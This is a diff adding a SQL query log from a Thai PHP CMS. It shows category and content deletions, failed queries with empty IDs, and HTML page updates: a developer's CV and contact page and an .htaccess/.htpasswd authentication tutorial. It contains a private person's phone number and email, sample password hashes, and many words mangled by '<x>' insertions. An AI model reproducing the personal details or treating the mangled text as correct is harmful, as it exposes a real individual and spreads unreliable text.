@@ -1,0 +1,1175 @@
+14:03:36 :  => Delete From category Where category_id = 5 
+14:03:36 :  => Delete From category Where category_id = 1 
+14:03:36 :  => Delete From category Where category_id = 6 
+14:03:36 :  => Delete From category Where category_id = 2 
+14:03:36 :  => Delete From category Where category_id = 23 
+14:03:36 :  => Delete From category Where category_id = 8 
+14:03:36 :  => Delete From category Where category_id = 7 
+14:03:37 :  => Delete From category Where category_id =  
+14:03:37 :  => Delete From category Where category_id =  
+14:03:37 :  => Delete From content Where content_id = 15 
+14:03:37 :  => Delete From content Where content_id = 16 
+14:03:37 :  => Delete From content Where content_id = 17 
+14:03:37 :  => Delete From content Where content_id = 14 
+14:03:37 :  => Delete From content Where content_id = 13 
+14:03:38 :  => Delete From content Where content_id = 12 
+14:03:38 :  => Delete From content Where content_id = 11 
+14:03:38 :  => Delete From content Where content_id = 10 
+14:03:38 :  => Delete From content Where content_id = 9 
+14:03:38 :  => Delete From content Where content_id = 8 
+14:03:38 :  => Delete From content Where content_id =  
+14:03:38 :  => Delete From content Where content_id =  
+14:03:47 :  => Insert into category (category_name,category_remark,weight) Values ('','','1') 
+14:03:47 :  => ERROR : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1Update category SET category_name='',category_remark='',weight='' Where category_id =  
+14:03:47 :  => Insert into category (category_name,category_remark,weight) Values ('','','') 
+14:03:47 :  => Update category SET category_name='Linux Quick Tips',category_remark='ทริคและเทคนิคของ Red Hat',weight='2' Where category_id = 2 
+14:03:47 :  => ERROR : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1Update category SET category_name='',category_remark='',weight='' Where category_id =  
+14:03:47 :  => Update category SET category_name='Java sc<x>ript Tips',category_remark='ทริคและเทคนิคของ ja<x>vasc<x>ript',weight='3' Where category_id = 6 
+14:03:47 :  => Update category SET category_name='Databa<x>se',category_remark='ความรู้ด้าน Databa<x>se ยี่ห้อต่างๆ',weight='4' Where category_id = 23 
+14:03:47 :  => Update category SET category_name='ZengCode fr<x>amework Guide',category_remark='Online Manual',weight='5' Where category_id = 8 
+14:03:47 :  => Update category SET category_name='Zeng Code Code',category_remark='แก้เครียด ระบาย ปลดปล่อย',weight='6' Where category_id = 7 
+14:03:47 :  => Update static_content SET content_detail='' Where content_key = '' 
+14:03:47 :  => Update static_content SET content_detail='&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;img height=&quot;189&quot; align=&quot;left&quot; width=&quot;200&quot; st<x>yle=&quot;margin-right: 10px;&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/mvc.jpg&quot; alt=&quot;&quot; /&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;สวัสดีครับแฟนๆ Madoogun.com ยินดีต้อนรับสู่บ้านใหม่ครับ&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;b&gt;&lt;span st<x>yle=&quot;color: rgb(153 51 0);&quot;&gt;ZengCode fr<x>amework&lt;/span&gt;&lt;/b&gt; ขอฝากเนื้อฝากตัวกับชาว Developer ทุกท่านด้วยนะครับ&lt;br /&gt;
+ผู้พัฒนาเองไม่ได้หวังว่ามันจะใช้งานได้ดีขนาดไปเทียบกับจ้างยุทธจักรด้านนี้ &lt;br /&gt;
+ไม่ว่าจะเป็น Prado หรือแม้แต่ Cake ซึ่งนั้นเค้าระดับ&lt;b&gt;&lt;span st<x>yle=&quot;color: rgb(153 51 0);&quot;&gt;เทพเรียกพี่&lt;/span&gt;&lt;/b&gt;แล้วครับ&lt;br /&gt;
+ผมก็เป็นแค่ Developer ธรรมดา ๆ คนนึงครับ&lt;br /&gt;
+ที่สร้าง fr<x>amework ตัวนี้ขึ้นมาก็เพื่อศึกษา และพัฒนาทักษะด้าน OOP ของตัวเอง&lt;/span&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+อีกทั้งปกติตัวผมเองเขียนโค้ดได้มั่วซั่วมาก ไม่มีระเบียบ อยากเขียนอะไรคิดออกก็เขียน&lt;br /&gt;
+ไม่มีแบบแผน บางทีกลับมาแก้โค้ดตัวเอง บอกได้คำเดียวว่า &lt;/span&gt;&lt;b&gt;&lt;span st<x>yle=&quot;color: rgb(153 51 0);&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;เซ็งโครต เซ็ง โครต โครต &lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+และนี่จึงเป็นที่มาของชื่อ fr<x>amework ของผมครับ&lt;br /&gt;
+และอีกประเด็นก็เพื่อจุดประการให้พี่น้องชาว Developer ทุกท่าน &lt;br /&gt;
+ช่วยกันคิดพัฒนาสิ่งต่างๆ เพื่อวงการด้าน IT&lt;br /&gt;
+ของเราได้ทัดเทียมนานาอารยะประเทศเค้านะคร ับผมขอเป็นจุดเล็กๆจุดนึงที่พร้อมจะมุ่งมั่น&lt;br /&gt;
+พัฒนาผลงานด้านนี้ต่อไปครับ สู้ๆ นะพี่น้องชาว Developer ทุกท่าน&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;hr /&gt;' Where content_key = 'hello' 
+14:03:47 :  => Update static_content SET content_detail='&lt;p&gt;&lt;b&gt;&lt;span st<x>yle=&quot;color: rgb(153 51 0);&quot;&gt;ติดต่อสอบถาม​​​ได้​​​ที่&lt;/span&gt;&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;ชื่อ&lt;/b&gt;​.......​​นาย​​ ​​ชีวะ​​... ​นามสกุล​... ​​กัน​​​ทะวงค์​​&lt;br /&gt;
+&lt;b&gt;ชื่อเล่น&lt;/b&gt;​.......​​พี&lt;br /&gt;
+&lt;b&gt;โทรศัพท์​&lt;/b&gt;...... 081-8308963&lt;br /&gt;
+&lt;b&gt;เว็บไซต์&lt;/b&gt;​..... http://www.zengcode.com&lt;br /&gt;
+&lt;b&gt;อี​​-​​เมล์​​&lt;/b&gt;....... kchiwa@gmail.com&lt;br /&gt;
+&lt;b&gt;MSN&lt;/b&gt;......p@madoogun.com&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+&amp;nbsp;&lt;/p&gt;' Where content_key = 'contact' 
+14:03:47 :  => Update static_content SET content_detail='&lt;p&gt;กรุณารอสักพักนะครับ กำลังปรับปรุงแก้ไขนิดหน่อย&lt;/p&gt;' Where content_key = 'download' 
+14:03:47 :  => Update static_content SET content_detail='&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;รับพัฒนา​​ Web  Application and E-Commerce .&lt;br /&gt;
+เขียน​​​ได้​​​ทั้ง​​​ภาษา​​ PHP  ASP  PERL  ColdFusion  Delphi  Java  .net technologyxm<x>l ​​&lt;br /&gt;
+สามารถ​​​พัฒนา​​​เว็บ​​​ด้วย​​ ajax technology ​​และ​​​อื่น​​ ​​ๆ&lt;br /&gt;
+เขียน​​​ได้​​​ทั้ง​​ Structure Programming ​​และ​​ OOP&lt;br /&gt;
+รองรับระบบฐานข้อมูล​​ Oracle  MySQL  MSSQL  Access  Paradox  Foxpro ​​และ​​​อื่น​​ ​​ๆ&lt;br /&gt;
+ประสบการณ์สูงทำ​​​ให้​​​คุณภาพสูง​​​ใน​​​ราคา​​​กัน​​​เอง​​ (ราคา​​​กัน​​​เองจริงๆ​​​ครับ)&lt;br /&gt;
+รับรองคุณภาพเกินราคาครับ&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;u&gt;&lt;b&gt;ติดต่อสอบถาม​​​ได้​​​ที่&lt;/b&gt;&lt;/u&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;ชื่อ​.......​​นาย​​ ​​ชีวะ​​... ​นามสกุล​... ​​กัน​​​ทะวงค์​​&lt;br /&gt;
+ชื่อเล่น​.......​​พี&lt;br /&gt;
+โทรศัพท์​...... 081-8308963&lt;br /&gt;
+เว็บไซต์​..... http://www.zengcode.com&lt;br /&gt;
+อี​​-​​เมล์​​....... kchiwa@gmail.com&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;u&gt;&lt;b&gt;การศึกษา&lt;/b&gt;&lt;/u&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;* 2534 - 2537 [ ​​โรงเรียนดอนเมืองทหารอากาศบำ​​​รุง] ​​กรุงเทพมหานคร​​ [ ​​มัธยมศึกษาตอนปลาย]&lt;br /&gt;
+* 2537 - 2543 [ ​​มหาวิทยาลัยรามคำ​​​แหง] ​​กรุงเทพมหานคร​​ [ ​​วิทยาศาสตร์บัณฑิต​​ ​​สาชาวิชาวิทยาการคอมพิวเตอร์]&lt;br /&gt;
+* ​ปัจจุบัน​ ​ศึกษา​อยู่​ระดับปริญา​โท​ ​สาขา​ Databa<x>se Administrator ​มหาวิทยาลัยเทคโนโลยีมหานคร&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;u&gt;&lt;b&gt;ประสบการณ์​​​ใน​​​สายอาชีพ&lt;/b&gt;&lt;/u&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;* ปัจจุบัน Fujitsu System Businese Thailand  ตำแหน่ง Application Engineer Supervisor  ดูแลด้าน Technocial และ Coding &lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;* ​2547-2551​​ ​​บริษัทเนกซี่ซอฟท์​​​แวร์​​ ​​จำ​​​กัด​​ ​​กรุงเทพมหานคร​​ ​ตำ​​​แหน่ง​​ ​​ Senior Programmer Analyst&lt;br /&gt;
+เขียนเว็บทาง​​​ด้วย​​ Phpjspjava bean.net technology (MySqloracleMsSqlxm<x>l) Ajax technology&lt;br /&gt;
+และ​เป้นวิทยากรพิ​เศษสถาบัณราชภํฎสวนสุนันทา​ (php &amp;amp; mysql)&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+* 2545-2547 ​​บริษัทป็อปปี้​​​โซลูชั่น​​ ​​จำ​​​กัด​​ ​​กรุงเทพมหาตร​​ ​​ตำ​​​แหน่ง​​ ​​โปรแกรมเมอร์​​  &lt;br /&gt;
+เขียนเว็บทาง​​​ด้วย​​ Phpjspjava beanasp (MySqloracleMsSql) ​​และ​​ Databa<x>se Application ​​ด้วย​​ Delphi&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;* 2544-2545 ​​บริษัทเจบีซี​​ ( ​​ประ​​​เทศไทย) ​​จำ​​​กัด​​ ​​กรุงเทพมหาตร​​ ​​ตำ​​​แหน่ง​​ ​​เดลไฟล์​​​โปรแกรมเมอร์​​ &lt;br /&gt;
+และ​​​เว็บโปรแกรมเมอร์​​ ​​เขียนเว็บทาง​​​ด้วย​​ Php (MySql) ​​และ​​ Databa<x>se Application ​​ด้วย​​ Delphi&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;* 543-2544 ​​บริษัทสุริยาลานนาจำ​​​กัด​​ ​​กรุงเทพมหาตร​​ ​​ตำ​​​แหน่ง​​ ​​เว็บโปรแกรมเมอร์​​ ​&lt;br /&gt;
+เขียนเว็บทางด้าน​​ e-commerce ​​ด้วย​​ Marcromedia ColdFusion ​​และ​​ Databa<x>se Application ​​ด้วย​​ Delphi&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+&lt;u&gt;&lt;b&gt;ผลงานอ้างอิง&lt;/b&gt;&lt;/u&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;*http://www.madoogun.com/map  Google Map Api &lt;br /&gt;
+* http://www.supremecourt.or.th  ศาลฎีกา&lt;br /&gt;
+* http://service.nso.go.th/nso/li<x>nks/li<x>nks01.html  สำนักงานสถิติแห่งชาติ&lt;br /&gt;
+* http://www.gemstable.com/auction  เว็บประมูลอัญมณี&lt;br /&gt;
+* http://www.lanabiz.com&lt;br /&gt;
+* http://www.silverware.com&lt;br /&gt;
+* http://www.thaiantivirus.com&lt;br /&gt;
+* http://www.police.go.th&lt;br /&gt;
+* http://www.poppymail.com&lt;br /&gt;
+* http://www.sahatawee.com&lt;br /&gt;
+* http://www.khonkaen.go.th&lt;br /&gt;
+* http://www.mayamobile.com&lt;br /&gt;
+* http://www.madoogun.com&lt;br /&gt;
+* http://www.keepjob.com&lt;br /&gt;
+* http://www.artplanet.com&lt;br /&gt;
+* http://chichacojeans.com&lt;br /&gt;
+* http://www.benzmarket.com&lt;br /&gt;
+* http://www.dsi.go.th&lt;br /&gt;
+* http://www.hotels.com&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;และ​​​เว็บแอ็พพิ​​​เคชั่นอีกมากมายที่​​​เป้น​​ intranet ​​สำ​​​หรับผลงานด้าน​​ Application ​​&lt;br /&gt;
+ที่สำ​​​คํญๆ​​​ของหน่วยงานราชการต่างๆ​​ ​​เช่น​​ ​​สำ​​​นักงานสถิติ​​​แห่งชาติ​​ ​​สำ​​​นักงานตำ​​​รวจแห่งชาติ​​ ​​กระทรวงคมนาคม​​ ​​สำ​​​นักพระราชวัง​​ ​​เป็น​​​ต้น​​ ​​&lt;br /&gt;
+ส่วน​​​ใหญ่​​​จะ​​​พัฒนา​​​ด้วย​​ Java+xm<x>l&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;* ​โปแกรมรับสมัครตำ​​​รวจ​​ ( ​​ตม) ​​ของสำ​​​นักงานตำ​​​รวจแห่งขาติ​​&lt;br /&gt;
+* ​โปรมแกรม​​​ค้น​​​หาประวัติรถยนต์​​​ทั่ว​​​ประ​​​เทศ​​ ​​ของสำ​​​นักงานตำ​​​รวจแห่งชาติ​​&lt;br /&gt;
+* ​โปรแกรม​​ Time Stamp ​​ของบริษัท​​ ​​จอร์นสันแอนด์จอร์นสัน​​ ​​ประ​​​เทศไทยจำ​​​กัด​​&lt;br /&gt;
+* ​โปรแกรมระบบบริหารฟาร์มไก่​​ ( ​​ระบบปิด) ​​และ​​​โปรแกรมเล้กๆ​​​น้อยๆ​​​อีกมากมาย​​&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-size: larger;&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;b&gt;Web Site : http://www.zengcode.com&lt;br /&gt;
+ติดต่องาน​​​ได้​​​ที่​​ : kchiwa@gmail.com&lt;br /&gt;
+หรือ​​​โทร​​ : 081-8308963&lt;/b&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt; &lt;br /&gt;
+&lt;/span&gt;&lt;/p&gt;' Where content_key = 'about' 
+14:03:47 :  => Update static_content SET content_detail='' Where content_key = '' 
+14:03:48 :  => Insert into content (category_id,content_name,content_summary,content_detail,post_date) Values ('','','','',now()) 
+14:03:48 :  => Insert into content (category_id,content_name,content_summary,content_detail,post_date) Values ('','','','',now()) 
+14:03:48 :  => ERROR : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1Update content SET category_id='',content_name='',content_summary='',content_detail='' Where content_id =  
+14:03:48 :  => Update content SET category_id='',content_name='User authentication ด้วย .htpasswd + .htaccess',content_summary='&lt;p&gt;&lt;img height=&quot;121&quot; width=&quot;121&quot; alt=&quot;&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/rd.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;ขั้นตอนการ lock ห้องของตนเอง ในฐานะผู้ใช้ทั่วไป&lt;/b&gt;&lt;/p&gt;
+&lt;ol&gt;
+    &lt;li&gt;ท่านต้องส่งแฟ้ม 2 แฟ้มคือ .htpasswd และ .htaccess ไปไว้ในห้องที่ต้องการ lock โดยทำการถาม User และ password ก่อนเข้า&lt;/li&gt;
+    &lt;li&gt;&lt;b&gt;.htaccess&lt;/b&gt; นั้นสามารถคัดลอกด้านล่างไปได้เลย โดยแก้ไขอะไรเล็กน้อยตามต้องการ เช่นเปลี่ยนคำว่า lock ที่บรรทัดแรก เป็น username ของท่าน................................&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;',content_detail='&lt;p&gt;อ่านเพิ่มเติมได้จาก http://www.apacheweek.com/features/userauth &lt;br /&gt;
+หรือ http://www.thaiall.com/cgi/htpasswd.pl&lt;/p&gt;
+&lt;ol&gt;&lt;b&gt;ขั้นตอนการ lock ห้องของตนเอง ในฐานะผู้ใช้ทั่วไป&lt;/b&gt;
+    &lt;li&gt;ท่านต้องส่งแฟ้ม 2 แฟ้มคือ .htpasswd และ .htaccess ไปไว้ในห้องที่ต้องการ lock โดยทำการถาม User และ password ก่อนเข้า&lt;/li&gt;
+    &lt;li&gt;&lt;b&gt;.htaccess&lt;/b&gt; นั้นสามารถคัดลอกด้านล่างไปได้เลย โดยแก้ไขอะไรเล็กน้อยตามต้องการ เช่นเปลี่ยนคำว่า lock ที่บรรทัดแรก เป็น username ของท่าน&lt;/li&gt;
+    &lt;li&gt;&lt;b&gt;.htpasswd&lt;/b&gt; แต่ละบรรทัดคือ 1 user สำหรับแฟ้มนี้ ถ้าผู้ดูแลไม่คิดบริการ ท่านก็ใช้บริการไม่ได้ สำหรับ server ที่ผมดูแล ได้ทำ &lt;a href=&quot;http://www.isinthai.com/lock&quot;&gt;โปรแกรมเข้ารหัส&lt;/a&gt; สร้างรหัสให้ &lt;br /&gt;
+    ถ้าเป็นผู้ดูแล(Super user) สามารถใช้ &lt;br /&gt;
+    คำสั่ง &lt;b&gt;#htpasswd -nb yourname yourpassword&lt;/b&gt; แสดงรหัสผ่าน ที่ shell prompt &lt;br /&gt;
+    คำสั่ง &lt;b&gt;#htpasswd -c .htpasswd yourname&lt;/b&gt; สร้างแฟ้ม .htpasswd พร้อม รอรับรหัสผ่าน จากแป้นพิมพ์ &lt;br /&gt;
+    ดูเพิ่มเติมจาก &lt;b&gt;#man htpasswd&lt;/b&gt; ที่ shell prompt&lt;/li&gt;
+    &lt;li&gt;เปิด เว็บ http://www.isinthai.com/lock/index.php เพื่อป้อนรหัสผู้ใช้ และรหัสผ่าน จะได้รหัสที่สร้างขึ้น เพื่อนำไปเพิ่มในแฟ้ม .htpasswd&lt;/li&gt;
+&lt;/ol&gt;
+&lt;ul&gt;&lt;b&gt;http://www.isinthai.com/lock/.htaccess&lt;/b&gt;&lt;font face=&quot;courier new&quot; color=&quot;red&quot;&gt;
+    &lt;ul&gt;AuthUserFile /var/www/html/lock/.htpasswd &lt;br /&gt;
+        AuthName &amp;quot;User:yourname Password:yourpassword for accessing this directory&amp;quot; &lt;br /&gt;
+        AuthType Basic &lt;br /&gt;
+        require valid-user &lt;br /&gt;
+        DirectoryIndex index.html index.htm index.shtml index.php&lt;/ul&gt;
+        &lt;/font&gt;&lt;b&gt;http://www.isinthai.com/lock/.htpasswd&lt;/b&gt;&lt;font face=&quot;courier new&quot; color=&quot;red&quot;&gt;
+        &lt;ul&gt;test:1A/c8vPQJQiL2 &lt;br /&gt;
+            yourname:UtecEDcEa3/L2&lt;/ul&gt;
+            &lt;/font&gt;&lt;b&gt;ปัญหา และวิธีแก้ไข ที่ผู้ดูแลอาจพบ&lt;/b&gt;&lt;dd&gt;ครั้งแรกที่สร้าง .htaccess และ .htpasswd ก็ไม่เกิดผล คือสองแฟ้มนี้ไม่ทำงาน ตรวจสอบแล้วพบว่าผู้ดูแลต้องแก้แฟ้ม &lt;font face=&quot;courier new&quot;&gt;/etc/httpd/conf/httpd.conf&lt;/font&gt;  &lt;/dd&gt;&lt;dd&gt;ให้ส่วนของ &amp;lt;Directory &amp;quot;/var/www/html&amp;quot;&amp;gt; ในบรรทัดที่เขียนว่า &lt;b&gt;AllowOverride None เปลี่ยนเป็น AllowOverride All&lt;/b&gt; &lt;/dd&gt;&lt;dd&gt;หรือส่วนของ &amp;lt;Directory &amp;quot;/&amp;quot;&amp;gt; ในบรรทัดที่เขียนว่า &lt;b&gt;AllowOverride None เปลี่ยนเป็น AllowOverride All&lt;/b&gt; ถ้าท่านใช้ public_html &lt;/dd&gt;&lt;/ul&gt;
+            &lt;p&gt;ที่มา http://www.isinthai.com/?q=0974&lt;/p&gt;' Where content_id = 12 
+14:03:48 :  => Update content SET category_id='',content_name='ความสัมพันธ์ระหว่าง Class Diagram และ Databa<x>se',content_summary='&lt;p&gt;&lt;img height=&quot;85&quot; alt=&quot;&quot; width=&quot;127&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/databa<x>se.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;ไปเจอมาจาก narisa เห็นว่าน่าสนใจ ขอบคุณเหล่าทวยเทพแห่ง narisa ด้วยนะครับ &lt;br /&gt;
+โดยเฉพาะเจ้าของคุณ&amp;nbsp; &lt;a st<x>yle=&quot;color: rgb(153510)&quot; href=&quot;http://www.narisa.com/forums/index.php?s=95e82fb3e302072bbd4aa5292a9b7da5&amp;amp;showuser=10538&quot;&gt;minimalist&lt;/a&gt;&lt;br st<x>yle=&quot;color: rgb(153510)&quot; /&gt;
+http://www.narisa.com/forums/index.php?showtopic=14372&lt;/p&gt;',content_detail='&lt;p&gt;&lt;b&gt;&lt;span st<x>yle=&quot;color: #ff0000&quot;&gt;ไปเจอมาจาก narisa เห็นว่าน่าสนใจ ขอบคุณเหล่าทวยเทพแห่ง narisa ด้วยนะครับ &lt;br /&gt;
+โดยเฉพาะเจ้าของคุณ&amp;nbsp; &lt;/span&gt;&lt;/b&gt;&lt;a st<x>yle=&quot;color: rgb(153510)&quot; href=&quot;http://www.narisa.com/forums/index.php?s=95e82fb3e302072bbd4aa5292a9b7da5&amp;amp;showuser=10538&quot;&gt;&lt;b&gt;&lt;span st<x>yle=&quot;color: #ff0000&quot;&gt;minimalist&lt;/span&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt;&lt;span st<x>yle=&quot;color: #ff0000&quot;&gt;&lt;br st<x>yle=&quot;color: rgb(153510)&quot; /&gt;
+http://www.narisa.com/forums/index.php?showtopic=14372&lt;/span&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&amp;nbsp;ตอนทำ Analysis เราต้องระบุว่าแต่ละคลาสที่หาได้เป็นคลาสชนิดใด&lt;br /&gt;
+&lt;br /&gt;
+Analysis Class มี 3 ประเภท คือ&lt;br /&gt;
+1. Boundary Class คือส่วนติดต่อระหว่าง Actor กับ Use Case หรือ เอาให้ง่ายขึ้นคือ ส่วนติดต่อระหว่างโปรแกรมกับคนหรืออุปกรณ์หรือโปรแกรมอื่น เช่น หน้าจอ อินเตอร์เฟสใน OO หรือใน Java&lt;br /&gt;
+2. Control Class คือส่วนที่ทำหน้าที่ประมวลผล Logic หลักของ Use Case นั้น&lt;br /&gt;
+3. Entity Class คือส่วนที่ Represent ข้อมูลที่การประมวลผลใน Use Case นั้นมีการเรียกใช้ (ปกติคือ Read / Write)&lt;br /&gt;
+&lt;br /&gt;
+ob<x>ject Data Model แบบพื้นฐานก็คือการดึงเอาพวก Entity Class ออกมารวมกันใน Class Diagram เดียว กำหนด&lt;br /&gt;
+ความสัมพันธ์พวก Association Composition Aggregation Generalization ให้เรียบร้อย และกำหนด Multiplicity ให้สมบูรณ์&lt;br /&gt;
+(ย้ำ สมบูรณ์) ส่วน Navigability กำหนดให้เป็นแบบ Bi-Directional ชัวร์สุด กันเหนียว&lt;br /&gt;
+&lt;br /&gt;
+จากนั้น Class Diagram นี้ก็ Map ไปเป็น Relational Data Model (ER Diagram) ต่ออีกที การ Map จากยากหน่อย&lt;br /&gt;
+หากใน ob<x>ject Data Model มีการใช้ความสัมพันธ์แบบ Generalization (การ Extend / Inheritance) เพราะ Table ใน&lt;br /&gt;
+Relational Databa<x>se มัน Extend / Inherit กันไม่ได้ ต้องใช้เทคนิคในการ Map หรือใช้พวก Architectural Patterns&lt;br /&gt;
+มาช่วยในการ Map&lt;br /&gt;
+&lt;br /&gt;
+การ Map ที่ว่าข้างต้นเรียกว่าการทำ ob<x>ject-to-Relational Mapping (ORM)&lt;br /&gt;
+&lt;br /&gt;
+ส่วนจะทำอะไรก่อนอะไรหลังระหว่างทำคลาสก่อน หรือ ทำ table ก่อน&lt;br /&gt;
+&lt;br /&gt;
+ขึ้นกับ Software Development Process และที่สำคัญขึ้นกับการแบ่งทีมงาน (Resource) และความรู้ความชำนาญของผู้ทำ&lt;br /&gt;
+เช่น&lt;br /&gt;
+&lt;br /&gt;
+Case: 1&lt;br /&gt;
+นาย ก เป็น Software Designer ออกแบบ ob<x>ject Data Model เก่ง นาย ก ก็ทำไป ส่วนนาย ข ออกแบบ ER Diagram เก่ง&lt;br /&gt;
+นาย ข ก็ทำไป สุดท้าย นาย ค เป็น Architect หรือ เป็นอะไรก็ได้แต่เก่ง ORM ก็มาทำการ Map งานนาย ก กับนาย ข&lt;br /&gt;
+&lt;br /&gt;
+Case: 2&lt;br /&gt;
+นาย ก เก่งไปหมด Solo คนเดียว ดังนั้นจะทำอะไรก่อนก็ได้ หรือทำไปพร้อม ๆ กันก็ได้ เช่น หาคลาสได้ 4 ตัว ก็ Map ไปเป็น&lt;br /&gt;
+Table ก่อน จากนั้นอีก 4 วันหาคลาสได้อีก 5 ตัว ก็ Map ไปเป็น Table อีก&lt;br /&gt;
+&lt;br /&gt;
+Case: 3&lt;br /&gt;
+บริษัทของนาย ก ข และ ค ใช้ Software Development Process คือ XP โดยมี Policy ว่าต้องออกแบบ ob<x>ject Data Model&lt;br /&gt;
+ก่อน แล้วค่อย Map ไปเป็น ER Diagram ดังนั้น นาย ก ต้องออกแบบ ob<x>ject Data Model ก่อน เสร็จแล้วนาย ค&lt;br /&gt;
+ก็ Map ไปเป็น ER Diagram โดยนาย ค มีนาย ข เป็นที่ปรึกษาด้าน RDBMS / Relational Databa<x>se Design&lt;br /&gt;
+* ซึงบริษัทใหญ่ ๆ นาย ข มักถูกแบ่งออกไปเป็น นาย ข-ไข่ ทำหน้าที่ออกแบบ ER Diagram และ นาย ข-ขวด ทำหน้าที่&lt;br /&gt;
+เป็น DBA&lt;br /&gt;
+&lt;br /&gt;
+Case: 4&lt;br /&gt;
+บริษัทของนาย ก ข และ ค มีประสบการณ์และชำนาญด้าน RDBMS และ/หรือ ไม่มี Software Development Process&lt;br /&gt;
+ที่มีวุฒิภาวะ (Maturity) ที่ดี และ/หรือ DBA เป็นใหญ่หรือมี Power มาก (หลายองค์กรโอ๋ DBA มากเกินควร เพราะ Sensitive&lt;br /&gt;
+กับข้อมูลใน \'ถัง\' ข้อมูลมากเกินไป) และ/หรือ นาย ก ไม่ได้เก่งด้าน ob<x>ject Data Model แท้จริง แต่มีรากเหง้าประสบการณ์&lt;br /&gt;
+ความรู้ ความชำนาญ และทัศนคติด้านการออกแบบ ER Diagram มามาก (เข้าข่าย Databa<x>se Driven Development)&lt;br /&gt;
+อาจทำให้การออกแบบ ob<x>ject Data Model ไม่ดีเท่าที่ควร Case นี้ นาย ข มักเป็นผู้เริ่มทำก่อน โดยออกแบบ ER Diagam&lt;br /&gt;
+ก่อน แล้วนาย ก ค่อยมาดูแล้ว Map ไปเป็นคลาส แต่ด้วย นาย ก ไม่แม่นเรื่อง ob<x>ject Data Model ทำให้อาจได้คลาส&lt;br /&gt;
+แบบผิด ๆ หรือไม่ดีออกมาได้ หลายครั้งสำหรับ Case นี้มักพบว่านาย ก กับนาย ข เป็นคนคนเดียวกัน คือ นาย กข และมักออกแบบ&lt;br /&gt;
+ER Diagram ก่อน โดยในหัวคิดอะไรก็เป็น Column Record Table Primary Key Compound Key Foreign Key&lt;br /&gt;
+Constraint One-to-One One-to-Many Many-to-Many ฯลฯ แล้วค่อยมาหาคลาส หลายครั้งพบว่า ob<x>ject Data Model&lt;br /&gt;
+ไม่ได้ทำ แต่ได้คลาสเลย พอต่อมามีปัญหาขึ้นมา จะ Trace กลับไปก็ลำบาก&lt;br /&gt;
+&lt;br /&gt;
+ยังมี Case อื่น ๆ อีก แต่ 4 Case ข้างบนมักพบเห็นได้บ่อย ๆ Case ที่ดีคือจะทำอะไรก่อนก็ได้ระหว่าง ob<x>ject Data Model&lt;br /&gt;
+กับ ER Diagram แต่สำคัญไอ้เจ้าตรงกลางนี่ล่ะ คือการทำ ob<x>ject-to-Relational Mapping ต้องมีคนทำเป็นจริง ๆ&lt;br /&gt;
+Map เป็น คนที่ Map เก่งนอกจากต้องเก่ง OO การออกแบบ ob<x>ject Data Model และการออกแบบ ER Diagram แล้ว&lt;br /&gt;
